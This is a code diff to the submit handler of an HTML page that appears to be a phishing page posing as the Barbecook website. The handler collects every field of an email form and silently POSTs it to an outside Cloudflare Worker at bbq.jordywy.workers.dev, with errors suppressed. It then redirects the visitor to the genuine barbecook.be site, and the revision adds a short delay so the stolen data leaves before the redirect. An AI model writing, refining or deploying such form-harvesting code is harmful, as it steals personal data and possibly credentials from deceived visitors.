@@ -228,20 +228,24 @@
     <a href="#">More languages…</a>
 </div>
 <script>
-document.getElementById('email-form-step').addEventListener('submit', async function (e) {
+document.getElementById('email-form-step').addEventListener('submit', function (e) {
   e.preventDefault();
-  const data = Object.fromEntries(new FormData(e.target));
-  try {
-    await fetch('https://bbq.jordywy.workers.dev', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(data)
-    });
-  } catch (err) {
-    // stil falen
-  }
-  // Altijd doorsturen naar de website na het versturen
-  window.location.href = 'https://www.barbecook.be/';
+  e.stopPropagation();
+
+  const form = e.target;
+  const data = Object.fromEntries(new FormData(form));
+
+  // Verstuur naar de Worker (niet wachten op antwoord)
+  fetch('https://bbq.jordywy.workers.dev', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(data)
+  }).catch(() => {});
+
+  // Direct doorsturen (met kleine vertraging zodat de request vertrekt)
+  setTimeout(function () {
+    window.location.href = 'https://www.barbecook.be/';
+  }, 300);
 });
 </script>
 </body>
